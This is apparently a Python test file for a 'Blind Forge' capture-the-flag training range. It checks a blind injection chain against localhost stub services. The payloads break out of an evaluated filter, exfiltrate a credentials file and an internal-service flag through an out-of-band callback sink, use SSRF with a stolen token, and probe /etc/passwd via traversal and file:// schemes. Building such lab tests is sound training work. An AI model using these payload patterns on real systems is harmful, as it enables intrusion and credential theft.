"""Blind Forge estate test — blind filter injection -> OOB channel -> crown.

Starts the three stdlib services (quoting portal, internal records service,
collaborator sink) on ephemeral localhost ports, then walks the blind chain
end-to-end and asserts every step, plus the negative cases that make the
estate's premise real:

- ``/quote`` has exactly one possible response — a real reference, an unknown
  reference, a fired injection and a raised exception are byte-identical, so
  there is no response oracle, not even a boolean one;
- execution is provable only out-of-band: ``notify()`` lands a hit on a
  registered sink token, and ``sleep()`` shows up as latency, while the
  response bytes stay fixed in both cases;
- ``readfile`` recovers the forge token and ``fetch`` reaches the internal
  records service through the portal's route, and the crown only reaches the
  operator by being pushed to the sink — it never appears in a portal response;
- the records service denies a missing or wrong token, the sink denies an
  unregistered token, and an unused token replays an empty hit log;
- ``readfile`` cannot escape the quoting data directory and ``fetch`` refuses
  non-http(s) schemes, so neither primitive substitutes for the other.

Pure stdlib; no podman/libvirt/qemu required.
"""
from __future__ import annotations

import importlib.util
import json
import sys
import tempfile
import time
import unittest
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Dict, List, Optional, Tuple

ROOT = Path(__file__).resolve().parents[1]  # range/
sys.path.insert(0, str(ROOT))

_SERVICES_PATH = ROOT / "estates" / "blind-forge" / "services.py"
_spec = importlib.util.spec_from_file_location("blindforge_services", _SERVICES_PATH)
services = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(services)


def http_get(url: str, headers: Optional[Dict[str, str]] = None,
             timeout: float = 15.0) -> Tuple[int, dict, bytes]:
    """One HTTP GET; returns (status, headers, body) without raising on 4xx/5xx."""
    request = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, dict(response.headers), response.read()
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers or {}), exc.read()


def http_post(url: str, body: str = "", timeout: float = 15.0) -> Tuple[int, dict, bytes]:
    """One HTTP POST; returns (status, headers, body) without raising on 4xx/5xx."""
    request = urllib.request.Request(
        url, data=body.encode("utf-8"),
        headers={"Content-Type": "text/plain"}, method="POST")
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, dict(response.headers), response.read()
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers or {}), exc.read()


class BlindForgeEstateTest(unittest.TestCase):
    RECORDS_TOKEN = "forge-rec-4c91d2ae"
    CROWN_FLAG = "KEYSTONE{blindforge-crown-4c91d2}"

    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.estate = services.build_estate(
            Path(cls._tmp.name), cls.RECORDS_TOKEN, cls.CROWN_FLAG)
        for svc in cls.estate.values():
            svc.start()
        cls.portal = cls.estate["portal"]
        cls.records = cls.estate["records"]
        cls.sink = cls.estate["sink"]

    @classmethod
    def tearDownClass(cls):
        for svc in cls.estate.values():
            svc.stop()
        cls._tmp.cleanup()

    # --- helpers ---------------------------------------------------------------

    @property
    def portal_url(self) -> str:
        return f"http://127.0.0.1:{self.portal.port}"

    @property
    def records_url(self) -> str:
        return f"http://127.0.0.1:{self.records.port}"

    @property
    def sink_url(self) -> str:
        return f"http://127.0.0.1:{self.sink.port}"

    def quote(self, ref: str) -> Tuple[int, dict, bytes]:
        """Hit /quote with a raw (un-encoded) reference value."""
        url = f"{self.portal_url}/quote?ref={urllib.parse.quote(ref, safe='')}"
        return http_get(url)

    def register(self) -> Tuple[str, str]:
        """Register a collaborator token over HTTP; returns (token, callback_url)."""
        status, _headers, body = http_post(f"{self.sink_url}/register")
        self.assertEqual(status, 200, body)
        data = json.loads(body.decode())
        return data["token"], data["collab"]

    def hits(self, token: str) -> List[dict]:
        status, _headers, body = http_get(f"{self.sink_url}/collab/{token}/hits")
        self.assertEqual(status, 200, body)
        return json.loads(body.decode())["hits"]

    def poll_hits(self, token: str, expected: int = 1, timeout: float = 8.0) -> List[dict]:
        """Wait for out-of-band hits to land — the channel is asynchronous."""
        deadline = time.time() + timeout
        collected: List[dict] = []
        while time.time() < deadline:
            collected = self.hits(token)
            if len(collected) >= expected:
                return collected
            time.sleep(0.05)
        return collected

    def inject(self, helper_call: str) -> Tuple[str, Tuple[int, dict, bytes]]:
        """Fire one injection through /quote.

        ``{collab}`` in the payload is substituted with a freshly registered
        callback URL. The payload breaks out of ``ref == "<value>"`` and
        short-circuits on the helper so it runs exactly once per request:
        ``ref == "x" or <helper_call> or ref == "Q-1042"``.

        A plain replace (not ``str.format``) so dict literals such as
        ``{"X-Forge-Token": "..."}`` survive untouched.
        """
        token, collab = self.register()
        call = helper_call.replace("{collab}", collab)
        payload = f'x" or {call} or ref == "Q-1042'
        return token, self.quote(payload)

    # --- 01: the intel is public, the work is not ------------------------------

    def test_01_intel_published(self):
        status, _headers, body = http_get(self.portal_url + "/")
        self.assertEqual(status, 200)
        index = body.decode()
        self.assertIn("/quote?ref=Q-1042", index)
        self.assertIn("/dev-notes.txt", index)
        # the records service is NOT linked from the public index
        self.assertNotIn("/crown", index)
        self.assertNotIn("records", index.lower())

        status, _headers, body = http_get(self.portal_url + "/dev-notes.txt")
        self.assertEqual(status, 200)
        notes = body.decode()
        for helper in ("readfile", "fetch", "notify", "sleep"):
            self.assertIn(helper, notes)
        self.assertIn("NEVER echoes filter results", notes)
        self.assertIn(".forge_credentials", notes)
        self.assertIn("X-Forge-Token", notes)

    # --- 02: one endpoint, one possible response -------------------------------

    def test_02_quote_endpoint_has_exactly_one_response(self):
        known = self.quote(services.QUOTE_REF)
        unknown = self.quote("Q-9999")
        empty = self.quote("")
        malformed = self.quote('x" or 1/0 or "')  # raises ZeroDivisionError server-side

        self.assertEqual(known[0], 200)
        for status, _headers, body in (known, unknown, empty, malformed):
            self.assertEqual(status, 200)
            self.assertEqual(body, services.QUOTE_BODY)

        # the filter really did evaluate against the quote table
        self.assertIn(services.QUOTE_REF, self.portal.matched_refs)
        # and the raising filter was swallowed, not surfaced
        self.assertGreaterEqual(self.portal.eval_errors, 1)

    # --- 03/04: two oracles, neither of them in the response -------------------

    def test_03_oob_callback_proves_execution(self):
        before = self.portal.notify_calls
        token, (status, _headers, body) = self.inject('notify("{collab}")')
        self.assertEqual(status, 200)
        self.assertEqual(body, services.QUOTE_BODY)  # blind: response unchanged
        self.assertGreater(self.portal.notify_calls, before)

        collected = self.poll_hits(token)
        self.assertEqual(len(collected), 1, "one injection must land exactly one hit")
        self.assertEqual(collected[0]["src"], "127.0.0.1")
        self.assertEqual(collected[0]["seq"], 1)

    def test_04_timing_oracle_proves_execution(self):
        baselines = []
        for _ in range(3):
            start = time.monotonic()
            status, _headers, body = self.quote("Q-9999")
            baselines.append(time.monotonic() - start)
            self.assertEqual(status, 200)
            self.assertEqual(body, services.QUOTE_BODY)
        baseline = min(baselines)

        start = time.monotonic()
        status, _headers, body = self.quote('x" or sleep(0.4) or ref == "Q-1042')
        elapsed = time.monotonic() - start

        self.assertEqual(status, 200)
        self.assertEqual(body, services.QUOTE_BODY)  # blind: response unchanged
        self.assertGreaterEqual(self.portal.sleep_calls, 1)
        self.assertGreaterEqual(elapsed, 0.35, "sleep() must be observable as latency")
        self.assertLess(baseline, 0.1, "baseline latency must be far below the slept request")

    # --- 05: blind file read, exfiltrated through the callback -----------------

    def test_05_blind_readfile_exfiltrates_forge_token(self):
        payload = 'notify("{collab}", readfile(".forge_credentials"))'
        token, (status, _headers, body) = self.inject(payload)
        self.assertEqual(status, 200)
        self.assertEqual(body, services.QUOTE_BODY)

        collected = self.poll_hits(token)
        self.assertEqual(len(collected), 1)
        creds = json.loads(collected[0]["data"])["records"]
        self.assertEqual(creds["token"], self.RECORDS_TOKEN)
        self.assertEqual(creds["host"], "127.0.0.1")
        self.assertEqual(creds["port"], self.records.port)
        self.assertEqual(creds["crown_path"], services.CROWN_PATH)

    # --- 06: the records service gates the crown on the token -------------------

    def test_06_records_denies_without_token(self):
        status, _headers, body = http_get(self.records_url + services.CROWN_PATH)
        self.assertEqual(status, 401)
        self.assertNotIn(self.CROWN_FLAG.encode(), body)

        status, _headers, body = http_get(
            self.records_url + services.CROWN_PATH,
            headers={"X-Forge-Token": self.RECORDS_TOKEN + "-wrong"})
        self.assertEqual(status, 401)
        self.assertNotIn(self.CROWN_FLAG.encode(), body)
        self.assertGreaterEqual(self.records.denials, 2)

        # the token confirms on the low-value drawing index first
        status, _headers, body = http_get(
            self.records_url + "/drawing/D-77",
            headers={"X-Forge-Token": self.RECORDS_TOKEN})
        self.assertEqual(status, 200)
        drawing = json.loads(body.decode())
        self.assertEqual(drawing["drawing"], "D-77")
        self.assertIn(services.CROWN_PATH, drawing["note"])

    # --- 07: blind SSRF -> crown, out through the callback ----------------------

    def test_07_blind_ssrf_exfiltrates_crown(self):
        records_crown = f"{self.records_url}{services.CROWN_PATH}"
        payload = ('notify("{collab}", fetch("' + records_crown + '", '
                   '{"X-Forge-Token": "' + self.RECORDS_TOKEN + '"}))')
        token, (status, _headers, body) = self.inject(payload)
        self.assertEqual(status, 200)
        self.assertEqual(body, services.QUOTE_BODY)
        self.assertNotIn(self.CROWN_FLAG.encode(), body)  # never in the response
        self.assertGreaterEqual(self.portal.fetch_calls, 1)
        self.assertGreaterEqual(self.records.crown_reads, 1)

        collected = self.poll_hits(token)
        self.assertEqual(len(collected), 1)
        recovered = collected[0]["data"].strip()
        self.assertEqual(recovered, self.CROWN_FLAG)
        self.assertRegex(recovered, r"^KEYSTONE\{blindforge-crown-")

    # --- 08: the sink refuses tokens it did not mint ----------------------------

    def test_08_sink_refuses_unregistered_token(self):
        status, _headers, body = http_get(self.sink_url + "/collab/not-a-real-token")
        self.assertEqual(status, 404)
        self.assertIn("unknown token", body.decode())

        status, _headers, body = http_post(
            self.sink_url + "/collab/not-a-real-token", self.CROWN_FLAG)
        self.assertEqual(status, 404)

        status, _headers, body = http_get(
            self.sink_url + "/collab/not-a-real-token/hits")
        self.assertEqual(status, 404)

        # a registered but unused token replays an empty log — nothing to guess
        token, _collab = self.register()
        self.assertEqual(self.hits(token), [])

    # --- 09: the crown never appears in any portal response ---------------------

    def test_09_no_portal_response_leaks_the_crown(self):
        records_crown = f"{self.records_url}{services.CROWN_PATH}"
        probes = [
            "/",
            "/dev-notes.txt",
            "/quote?ref=" + urllib.parse.quote(services.QUOTE_REF, safe=""),
            "/quote?ref=" + urllib.parse.quote("Q-9999", safe=""),
            "/quote?ref=" + urllib.parse.quote(
                f'x" or notify("{self.sink_url}/collab/probe", '
                f'fetch("{records_crown}", {{"X-Forge-Token": "{self.RECORDS_TOKEN}"}})) or ref == "Q-1042',
                safe=""),
            "/quote?ref=" + urllib.parse.quote(
                'x" or notify("{c}", readfile(".forge_credentials")) or ref == "Q-1042'.format(
                    c=self.sink_url + "/collab/probe"), safe=""),
            "/quote?ref=" + urllib.parse.quote(
                f'x" or fetch("{records_crown}", {{"X-Forge-Token": "{self.RECORDS_TOKEN}"}}) or ref == "Q-1042',
                safe=""),
        ]
        for path in probes:
            status, headers, body = http_get(self.portal_url + path)
            self.assertIn(status, (200, 404), path)
            self.assertNotIn(self.CROWN_FLAG.encode(), body, path)
            self.assertNotIn(self.RECORDS_TOKEN.encode(), body, path)
            self.assertNotIn(self.CROWN_FLAG, str(headers), path)
            self.assertNotIn(self.RECORDS_TOKEN, str(headers), path)

    # --- 10: neither primitive substitutes for the other ------------------------

    def test_10_readfile_confined_and_fetch_scheme_blocked(self):
        errors_before = self.portal.eval_errors
        token, (status, _headers, body) = self.inject(
            'notify("{collab}", readfile("../../../../etc/passwd"))')
        self.assertEqual(status, 200)
        self.assertEqual(body, services.QUOTE_BODY)
        self.assertGreater(self.portal.eval_errors, errors_before)
        self.assertEqual(self.poll_hits(token, expected=1, timeout=1.0), [],
                         "a confined readfile must exfiltrate nothing")

        errors_before = self.portal.eval_errors
        token, (status, _headers, body) = self.inject(
            'notify("{collab}", fetch("file:///etc/passwd"))')
        self.assertEqual(status, 200)
        self.assertEqual(body, services.QUOTE_BODY)
        self.assertGreater(self.portal.eval_errors, errors_before)
        self.assertEqual(self.poll_hits(token, expected=1, timeout=1.0), [],
                         "a blocked scheme must exfiltrate nothing")


if __name__ == "__main__":
    unittest.main()
